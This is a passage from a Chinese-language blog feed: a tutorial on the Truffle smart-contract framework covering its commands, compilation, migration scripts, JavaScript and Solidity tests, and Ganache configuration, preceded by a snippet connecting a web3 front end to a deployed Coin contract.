class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//引入truffle-contract</span></div><div class="line"><span class="keyword">var</span> contract = <span class="built_in">require</span>(<span class="string">'truffle-contract'</span>);</div><div class="line"><span class="comment">//引入合约地址</span></div><div class="line"><span class="keyword">var</span> CoinContract = <span class="built_in">require</span>(<span class="string">'../../contracts/Coin.json'</span>);</div><div class="line"></div><div class="line"><span class="comment">//获取当前窗口的web3的provider</span></div><div class="line"><span class="keyword">var</span> web3 = <span class="built_in">window</span>.web3</div><div class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> web3 !== <span class="string">'undefined'</span>) &#123;</div><div class="line">  web3 = <span class="keyword">new</span> Web3(web3.currentProvider)</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">  web3 = <span class="keyword">new</span> Web3(<span class="keyword">new</span> Web3.providers.HttpProvider(<span class="string">'http://127.0.0.1:7545/'</span>))</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">const</span> Contract = &#123;</div><div class="line">  contract: <span class="literal">null</span>,</div><div class="line">  instance: <span class="literal">null</span>,</div><div class="line">  account: <span class="literal">null</span>,</div><div class="line"></div><div class="line">  init: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">let</span> self = <span class="keyword">this</span></div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</div><div class="line">      <span class="comment">// 引入合约地址</span></div><div class="line">      self.contract = contract(CoinContract)</div><div class="line">      self.contract.setProvider(web3.currentProvider)</div><div class="line">      </div><div class="line">      <span class="comment">// 获取metamak当前账户</span></div><div class="line">      web3.eth.getAccounts(<span class="function"><span class="keyword">function</span>(<span class="params">error, accounts</span>) </span>&#123;</div><div class="line">        <span class="keyword">if</span> (error) &#123;</div><div class="line">          <span class="built_in">console</span>.log(error);</div><div class="line">        &#125;</div><div class="line">        self.account = accounts[<span class="number">0</span>]</div><div class="line">      &#125;)</div><div class="line">      <span class="comment">// 链接至区块链</span></div><div class="line">      self.contract.deployed().then(<span class="function"><span class="params">instance</span> =&gt;</span> &#123;</div><div class="line">        <span class="comment">// 返回合约</span></div><div class="line">        self.instance = instance</div><div class="line">        resolve()</div><div class="line">      &#125;).catch(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</div><div class="line">        reject(err)</div><div class="line">      &#125;)</div><div class="line">    &#125;)</div><div class="line"></div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">export</span> <span class="keyword">default</span> Contract</div></pre></td></tr></table></figure></p>
]]></content>
      
        
        <tags>
            
            <tag> 智能合约 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Truffle框架]]></title>
      <url>/2018/08/07/truffle/</url>
      <content type="html"><![CDATA[<p>— Truffle安装&amp;使用 —<br><a id="more"></a></p>
<h1 id="truffle"><a href="#truffle" class="headerlink" title="truffle"></a>truffle</h1><p>智能合约开发部署测试框架。<br><a href="https://truffleframework.com/" target="_blank" rel="external">truffle 官网</a><br>翻墙食用</p>
<h2 id="truffle安装"><a href="#truffle安装" class="headerlink" title="truffle安装"></a>truffle安装</h2><p>需要node.js环境使用npm安装<br><code>npm install -g truffle</code></p>
<h2 id="Ganache测试客户端"><a href="#Ganache测试客户端" class="headerlink" title="Ganache测试客户端"></a>Ganache测试客户端</h2><p>和Truffle一起使用，需要有Ethereum客户端。<br>Truffle官方推出了Ganache作为测试客户端（前身testrpc)<br>当基于Ganache充分测试之后，通过官方客户端进行发布，比如Geth，Parity，Cpp-ethereum等。</p>
<h2 id="truffle使用"><a href="#truffle使用" class="headerlink" title="truffle使用"></a>truffle使用</h2><table>
<thead>
<tr>
<th style="text-align:center">指令</th>
<th style="text-align:center">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>truffle init</code></td>
<td style="text-align:center">初始化一个新的工程，默认包含简单实例 </td>
</tr>
<tr>
<td style="text-align:center"><code>trffle compile</code></td>
<td style="text-align:center">编译工程，编译输出位于build/contracts</td>
</tr>
<tr>
<td style="text-align:center"><code>truffle migrate</code></td>
<td style="text-align:center">运行部署脚本</td>
</tr>
<tr>
<td style="text-align:center"><code>truffle migrate --reset</code></td>
<td style="text-align:center">当增加或者删除了某个合约后，可以执行命令重新部署合约。</td>
</tr>
<tr>
<td style="text-align:center"><code>truffle deploy</code></td>
<td style="text-align:center">运行部署脚本</td>
</tr>
<tr>
<td style="text-align:center"><code>truffle build</code></td>
<td style="text-align:center">基于配置文件，构建整个项目</td>
</tr>
<tr>
<td style="text-align:center"><code>truffle test</code></td>
<td style="text-align:center">执行测试</td>
</tr>
<tr>
<td style="text-align:center"><code>truffle develop</code></td>
<td style="text-align:center">启动测试链，使用Ganache当做测试链的话不需要使用 </td>
</tr>
<tr>
<td style="text-align:center"><code>truffle console</code></td>
<td style="text-align:center">启动truffle console，命令行</td>
</tr>
<tr>
<td style="text-align:center"><code>truffle create</code></td>
<td style="text-align:center">帮助你创建新的合约、部署脚本、测试脚本</td>
</tr>
<tr>
<td style="text-align:center"><code>truffle networks</code></td>
<td style="text-align:center">展示各个网络上部署的合约的地址</td>
</tr>
<tr>
<td style="text-align:center"><code>truffle watch</code></td>
<td style="text-align:center">查看是否有代码文件修改，如果有的话，重新构建整个项目</td>
</tr>
<tr>
<td style="text-align:center"><code>truffle serve</code></td>
<td style="text-align:center">启动一个本地服务器，展示该项目的代码目录和编译情况</td>
</tr>
<tr>
<td style="text-align:center"><code>truffle exec</code></td>
<td style="text-align:center">在Truffle环境中执行JS脚本</td>
</tr>
<tr>
<td style="text-align:center"><code>truffle unbox</code></td>
<td style="text-align:center">获取一个Truffle Box 项目</td>
</tr>
<tr>
<td style="text-align:center"><code>truffle version</code></td>
<td style="text-align:center">显示Truffle 版本</td>
</tr>
<tr>
<td style="text-align:center"><code>truffle install</code></td>
<td style="text-align:center">从 Ethereum Package Registry 上安装一个依赖包</td>
</tr>
<tr>
<td style="text-align:center"><code>truffle publish</code></td>
<td style="text-align:center">向 Ethereum Package Registry 发布一个包</td>
</tr>
</tbody>
</table>
<h2 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h2><p><code>truffle init</code>：需要新建一个空的文件夹作为项目工作空间<br>成功后会生成几个子目录:</p>
<ul>
<li><strong>contracts/</strong>：开发者编写的智能合约</li>
<li><strong>migrations/</strong>：存放部署脚本</li>
<li><strong>test/</strong>：存放测试文件</li>
<li><strong>truffle.js</strong>：Truffle默认配置文件</li>
</ul>
<p>项目创建成功后，可以使用<code>create</code>命令来生成合约文件、测试文件和部署文件</p>
<p><code>truffle create &lt;文件类型&gt; &lt;文件名称&gt;</code></p>
<ul>
<li><strong>文件类型</strong>：contract、test、migration</li>
<li><strong>文件名称</strong>：驼峰写法</li>
</ul>
<p>引用官网、社区的模板和实例<br><code>truffle unbox &lt;box名称&gt;</code></p>
<h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p><code>truffle compile</code>：自动将contracts目录下的sol文件进行编译，便已生成的Artifacts（实际上是智能合约对应的ABI信息）会放在<code>build/contracts</code>文件夹下（没有会自动创建）。</p>
<ul>
<li><strong>–all</strong>：强制编译所有智能合约文件，即使没有修改</li>
<li><strong>–network name</strong>：指定使用的网络，需要在配置文件中先声明这个网络的名称</li>
</ul>
<blockquote>
<p>如果合约文件没有改变，再次调用不会重新编译</p>
</blockquote>
<h3 id="编译合约之间的依赖"><a href="#编译合约之间的依赖" class="headerlink" title="编译合约之间的依赖"></a>编译合约之间的依赖</h3><p>依赖同个文件夹下的合约文件<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> <span class="string">"./AnotherContract.sol"</span>;</div></pre></td></tr></table></figure></p>
<p>依赖相关包中的合约文件<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> <span class="string">"somepackage/SomeContract.sol"</span>;</div></pre></td></tr></table></figure></p>
<blockquote>
<p>先从 EthPM 的包中引用 再从 NPM 的包总引用</p>
</blockquote>
<h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><p><code>truffle migrate</code>：部署合约。会自动检查有没有需要重新编译的智能合约文件。</p>
<ul>
<li><strong>–compile-all</strong>：不输钱强制重新编译所有智能合约</li>
<li><strong>–network name</strong>：指定使用的网络名称。</li>
<li><strong>–verbose-rpc</strong>：显示出Truffle和RPC客户端之间的通讯日志</li>
<li><strong>–reset</strong>：从最开始一次执行所有migration</li>
<li><strong>-f number</strong>：从指定的migration开始执行。number是指各个部署脚本的数字前缀</li>
</ul>
<p>会根据<code>/migrations/</code>文件夹下存放的Truffle部署文件来将智能合约部署到Ethereum网络中。</p>
<blockquote>
<p>truffle项目会默认包含一个叫做Migrations.sol的智能合约，这个合约可以讲用户执行步骤的历史记录下来</p>
</blockquote>
<h3 id="部署文件"><a href="#部署文件" class="headerlink" title="部署文件"></a>部署文件</h3><p><strong>部署文件</strong>是用JavaScript编写的脚本，支持智能合约之间的依赖关系。<br>部署文件文件名如下格式<br><code>4_example_migration.js</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> MyContract = artifacts.require(<span class="string">"MyContract"</span>);</div><div class="line"></div><div class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span>(<span class="params">deployer</span>) </span>&#123;</div><div class="line">  <span class="comment">// deployment steps</span></div><div class="line">  deployer.deploy(MyContract);</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<h4 id="artifacts-require"><a href="#artifacts-require" class="headerlink" title="artifacts.require"></a>artifacts.require</h4><p><code>var MyContract = artifacts.require(&quot;MyContract&quot;);</code><br><code>artifacts.require</code>类似于Node的<code>require</code>，但是是引入一个合约的抽象类<br>此处引入的名称 是 合约内的合约定义名称，而不是 合约文件名<br>因为一个合约文件中可以定义多个合约，如果有多个，就需要一个个引入</p>
<h4 id="model-exports"><a href="#model-exports" class="headerlink" title="model.exports"></a>model.exports</h4><p><code>module.exports = function(deployer) {</code></p>
<blockquote>
<p>此处deployer一般为固定参数，还可以传入其他参数如network，accounts等<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span>(<span class="params">deployer, network</span>) </span>&#123;</div><div class="line">  <span class="keyword">if</span> (network == <span class="string">"live"</span>) &#123;</div><div class="line">    <span class="comment">// Do something specific to the network named "live".</span></div><div class="line">  &#125; <span class="keyword">else</span> &#123;</div><div class="line">    <span class="comment">// Perform a different step otherwise.</span></div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
</blockquote>
<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span>(<span class="params">deployer, network, accounts</span>) </span>&#123;</div><div class="line">  <span class="comment">// Use the accounts within your migrations.</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>具体说明<a href="https://truffleframework.com/docs/getting_started/migrations#network-considerations" target="_blank" rel="external">这里</a></p>
<h4 id="deployer"><a href="#deployer" class="headerlink" title="deployer"></a>deployer</h4><p><code>deployer.deploy(MyContract);</code><br><a href="https://truffleframework.com/docs/getting_started/migrations#deployer-api" target="_blank" rel="external">官网API</a><br>按顺序部署<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 在B之前部署A</span></div><div class="line">deployer.deploy(A);</div><div class="line">deployer.deploy(B);</div></pre></td></tr></table></figure></p>
<p>依赖部署<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//部署A，然后部署B，传入一个新部署的地址</span></div><div class="line">deployer.deploy(A).then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> deployer.deploy(B, A.address);</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
<p>此处的依赖部署，需要在B合约中初始化导入参数A的地址，详情下面举例说明</p>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p><code>truffle test</code>/<code>truffle test ./path/test/file.js</code>：前者全部测试，后者选取一个测试<br>支持两种文件测试</p>
<ul>
<li>支持JavaScript文件的测试：<code>.js</code>,<code>.es</code>,<code>.es6</code>,<code>.jsx</code></li>
<li>支持Solidity文件的测试:<code>.sol</code><br>两种测试方式各有千秋,所有测试文件都放在<code>./test</code>文件下</li>
</ul>
<h3 id="JS测试文件"><a href="#JS测试文件" class="headerlink" title="JS测试文件"></a>JS测试文件</h3><p>Truffle测试是通过 Mocha 作为框架,Chai 作为断言。<br>步骤大致如下</p>
<ul>
<li>引入合约</li>
<li>建立测试项</li>
<li>返回通过或者错误</li>
</ul>
<p>使用<code>.then</code>形式<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> MetaCoin = artifacts.require(<span class="string">"MetaCoin"</span>);</div><div class="line"></div><div class="line">contract(<span class="string">'MetaCoin'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">accounts</span>) </span>&#123;</div><div class="line">  it(<span class="string">"should put 10000 MetaCoin in the first account"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> MetaCoin.deployed().then(<span class="function"><span class="keyword">function</span>(<span class="params">instance</span>) </span>&#123;</div><div class="line">      <span class="keyword">return</span> instance.getBalance.call(accounts[<span class="number">0</span>]);</div><div class="line">    &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">balance</span>) </span>&#123;</div><div class="line">      assert.equal(balance.valueOf(), <span class="number">10000</span>, <span class="string">"10000 wasn't in the first account"</span>);</div><div class="line">    &#125;);</div><div class="line">  &#125;);</div><div class="line">  it(<span class="string">"should call a function that depends on a linked library"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> meta;</div><div class="line">    <span class="keyword">var</span> metaCoinBalance;</div><div class="line">    <span class="keyword">var</span> metaCoinEthBalance;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> MetaCoin.deployed().then(<span class="function"><span class="keyword">function</span>(<span class="params">instance</span>) </span>&#123;</div><div class="line">      meta = instance;</div><div class="line">      <span class="keyword">return</span> meta.getBalance.call(accounts[<span class="number">0</span>]);</div><div class="line">    &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">outCoinBalance</span>) </span>&#123;</div><div class="line">      metaCoinBalance = outCoinBalance.toNumber();</div><div class="line">      <span class="keyword">return</span> meta.getBalanceInEth.call(accounts[<span class="number">0</span>]);</div><div class="line">    &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">outCoinBalanceEth</span>) </span>&#123;</div><div class="line">      metaCoinEthBalance = outCoinBalanceEth.toNumber();</div><div class="line">    &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">      assert.equal(metaCoinEthBalance, <span class="number">2</span> * metaCoinBalance, <span class="string">"Library function returned unexpected function, linkage may be broken"</span>);</div><div class="line">    &#125;);</div><div class="line">  &#125;);</div><div class="line">  it(<span class="string">"should send coin correctly"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> meta;</div><div class="line"></div><div class="line">    <span class="comment">// Get initial balances of first and second account.</span></div><div class="line">    <span class="keyword">var</span> account_one = accounts[<span class="number">0</span>];</div><div class="line">    <span class="keyword">var</span> account_two = accounts[<span class="number">1</span>];</div><div class="line"></div><div class="line">    <span class="keyword">var</span> account_one_starting_balance;</div><div class="line">    <span class="keyword">var</span> account_two_starting_balance;</div><div class="line">    <span class="keyword">var</span> account_one_ending_balance;</div><div class="line">    <span class="keyword">var</span> account_two_ending_balance;</div><div class="line"></div><div class="line">    <span class="keyword">var</span> amount = <span class="number">10</span>;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> MetaCoin.deployed().then(<span class="function"><span class="keyword">function</span>(<span class="params">instance</span>) </span>&#123;</div><div class="line">      meta = instance;</div><div class="line">      <span class="keyword">return</span> meta.getBalance.call(account_one);</div><div class="line">    &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">balance</span>) </span>&#123;</div><div class="line">      account_one_starting_balance = balance.toNumber();</div><div class="line">      <span class="keyword">return</span> meta.getBalance.call(account_two);</div><div class="line">    &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">balance</span>) </span>&#123;</div><div class="line">      account_two_starting_balance = balance.toNumber();</div><div class="line">      <span class="keyword">return</span> meta.sendCoin(account_two, amount, &#123;<span class="attr">from</span>: account_one&#125;);</div><div class="line">    &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">      <span class="keyword">return</span> meta.getBalance.call(account_one);</div><div class="line">    &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">balance</span>) </span>&#123;</div><div class="line">      account_one_ending_balance = balance.toNumber();</div><div class="line">      <span class="keyword">return</span> meta.getBalance.call(account_two);</div><div class="line">    &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">balance</span>) </span>&#123;</div><div class="line">      account_two_ending_balance = balance.toNumber();</div><div class="line"></div><div class="line">      assert.equal(account_one_ending_balance, account_one_starting_balance - amount, <span class="string">"Amount wasn't correctly taken from the sender"</span>);</div><div class="line">      assert.equal(account_two_ending_balance, account_two_starting_balance + amount, <span class="string">"Amount wasn't correctly sent to the receiver"</span>);</div><div class="line">    &#125;);</div><div class="line">  &#125;);</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
<p>使用<code>async/await</code>形式<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> MetaCoin = artifacts.require(<span class="string">"MetaCoin"</span>);</div><div class="line"></div><div class="line">contract(<span class="string">'2nd MetaCoin test'</span>, <span class="keyword">async</span> (accounts) =&gt; &#123;</div><div class="line"></div><div class="line">  it(<span class="string">"should put 10000 MetaCoin in the first account"</span>, <span class="keyword">async</span> () =&gt; &#123;</div><div class="line">     <span class="keyword">let</span> instance = <span class="keyword">await</span> MetaCoin.deployed();</div><div class="line">     <span class="keyword">let</span> balance = <span class="keyword">await</span> instance.getBalance.call(accounts[<span class="number">0</span>]);</div><div class="line">     assert.equal(balance.valueOf(), <span class="number">10000</span>);</div><div class="line">  &#125;)</div><div class="line"></div><div class="line">  it(<span class="string">"should call a function that depends on a linked library"</span>, <span class="keyword">async</span> () =&gt; &#123;</div><div class="line">    <span class="keyword">let</span> meta = <span class="keyword">await</span> MetaCoin.deployed();</div><div class="line">    <span class="keyword">let</span> outCoinBalance = <span class="keyword">await</span> meta.getBalance.call(accounts[<span class="number">0</span>]);</div><div class="line">    <span class="keyword">let</span> metaCoinBalance = outCoinBalance.toNumber();</div><div class="line">    <span class="keyword">let</span> outCoinBalanceEth = <span class="keyword">await</span> meta.getBalanceInEth.call(accounts[<span class="number">0</span>]);</div><div class="line">    <span class="keyword">let</span> metaCoinEthBalance = outCoinBalanceEth.toNumber();</div><div class="line">    assert.equal(metaCoinEthBalance, <span class="number">2</span> * metaCoinBalance);</div><div class="line"></div><div class="line">  &#125;);</div><div class="line"></div><div class="line">  it(<span class="string">"should send coin correctly"</span>, <span class="keyword">async</span> () =&gt; &#123;</div><div class="line"></div><div class="line">    <span class="comment">// Get initial balances of first and second account.</span></div><div class="line">    <span class="keyword">let</span> account_one = accounts[<span class="number">0</span>];</div><div class="line">    <span class="keyword">let</span> account_two = accounts[<span class="number">1</span>];</div><div class="line"></div><div class="line">    <span class="keyword">let</span> amount = <span class="number">10</span>;</div><div class="line"></div><div class="line"></div><div class="line">    <span class="keyword">let</span> instance = <span class="keyword">await</span> MetaCoin.deployed();</div><div class="line">    <span class="keyword">let</span> meta = instance;</div><div class="line"></div><div class="line">    <span class="keyword">let</span> balance = <span class="keyword">await</span> meta.getBalance.call(account_one);</div><div class="line">    <span class="keyword">let</span> account_one_starting_balance = balance.toNumber();</div><div class="line"></div><div class="line">    balance = <span class="keyword">await</span> meta.getBalance.call(account_two);</div><div class="line">    <span class="keyword">let</span> account_two_starting_balance = balance.toNumber();</div><div class="line">    <span class="keyword">await</span> meta.sendCoin(account_two, amount, &#123;<span class="attr">from</span>: account_one&#125;);</div><div class="line"></div><div class="line">    balance = <span class="keyword">await</span> meta.getBalance.call(account_one);</div><div class="line">    <span class="keyword">let</span> account_one_ending_balance = balance.toNumber();</div><div class="line"></div><div class="line">    balance = <span class="keyword">await</span> meta.getBalance.call(account_two);</div><div class="line">    <span class="keyword">let</span> account_two_ending_balance = balance.toNumber();</div><div class="line"></div><div class="line">    assert.equal(account_one_ending_balance, account_one_starting_balance - amount, <span class="string">"Amount wasn't correctly taken from the sender"</span>);</div><div class="line">    assert.equal(account_two_ending_balance, account_two_starting_balance + amount, <span class="string">"Amount wasn't correctly sent to the receiver"</span>);</div><div class="line">  &#125;);</div><div class="line"></div><div class="line">&#125;)</div></pre></td></tr></table></figure></p>
<h3 id="合约测试文件"><a href="#合约测试文件" class="headerlink" title="合约测试文件"></a>合约测试文件</h3><p>分函数测试，直接看例子：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> <span class="string">"truffle/Assert.sol"</span>;<span class="comment">//引入断言库</span></div><div class="line"><span class="keyword">import</span> <span class="string">"truffle/DeployedAddresses.sol"</span>;<span class="comment">//引入获取合约地址的库</span></div><div class="line"><span class="keyword">import</span> <span class="string">"../contracts/MetaCoin.sol"</span>;</div><div class="line"></div><div class="line">contract TestMetacoin &#123;</div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">testInitialBalanceUsingDeployedContract</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    MetaCoin meta = MetaCoin(DeployedAddresses.MetaCoin());</div><div class="line"></div><div class="line">    uint expected = <span class="number">10000</span>;</div><div class="line"></div><div class="line">    Assert.equal(meta.getBalance(tx.origin), expected, <span class="string">"Owner should have 10000 MetaCoin initially"</span>);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">testInitialBalanceWithNewMetaCoin</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    MetaCoin meta = <span class="keyword">new</span> MetaCoin();</div><div class="line"></div><div class="line">    uint expected = <span class="number">10000</span>;</div><div class="line"></div><div class="line">    Assert.equal(meta.getBalance(tx.origin), expected, <span class="string">"Owner should have 10000 MetaCoin initially"</span>);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>测试结果：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">$ truffle <span class="built_in">test</span></div><div class="line">Compiling ConvertLib.sol...</div><div class="line">Compiling MetaCoin.sol...</div><div class="line">Compiling truffle/Assert.sol</div><div class="line">Compiling truffle/DeployedAddresses.sol</div><div class="line">Compiling ../<span class="built_in">test</span>/TestMetacoin.sol...</div><div class="line"></div><div class="line">  TestMetacoin</div><div class="line">    ✓ testInitialBalanceUsingDeployedContract (61ms)</div><div class="line">    ✓ testInitialBalanceWithNewMetaCoin (69ms)</div><div class="line"></div><div class="line">  2 passing (3s)</div></pre></td></tr></table></figure>
<h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><p>部署到Ganache 或其他链上时，配置配置文件<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">module</span>.exports = &#123;</div><div class="line">  networks: &#123;</div><div class="line">    development: &#123;</div><div class="line">      host: <span class="string">"127.0.0.1"</span>,</div><div class="line">      port: <span class="number">7545</span>,</div><div class="line">      network_id: <span class="string">"*"</span></div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<h2 id="truffle-使用实例"><a href="#truffle-使用实例" class="headerlink" title="truffle 使用实例"></a>truffle 使用实例</h2><h3 id="部署合约依赖"><a href="#部署合约依赖" class="headerlink" title="部署合约依赖"></a>部署合约依赖</h3><p>在 Contract.sol 中使用 Coin 合约<br><code>Contract.sol</code>：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.15</span>;</div><div class="line"><span class="keyword">import</span> <span class="string">"./Coin.sol"</span>;</div><div class="line"></div><div class="line">contract Contract &#123;</div><div class="line">    Coin coin;</div><div class="line">    address owner;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Contract</span>(<span class="params">address _address</span>) <span class="title">public</span> </span>&#123;</div><div class="line">        coin = Coin(_address);</div><div class="line">        owner = msg.sender;</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
<p><code>2_deploy_all.js</code>部署文件：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> Coin = artifacts.require(<span class="string">"./Coin.sol"</span>);</div><div class="line"><span class="keyword">var</span> Contract = artifacts.require(<span class="string">"./Contract.sol"</span>);</div><div class="line"></div><div class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span>(<span class="params">deployer</span>) </span>&#123;</div><div class="line">  deployer.deploy(Coin).then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">return</span> deployer.deploy(Contract,Coin.address);</div><div class="line">  &#125;);</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
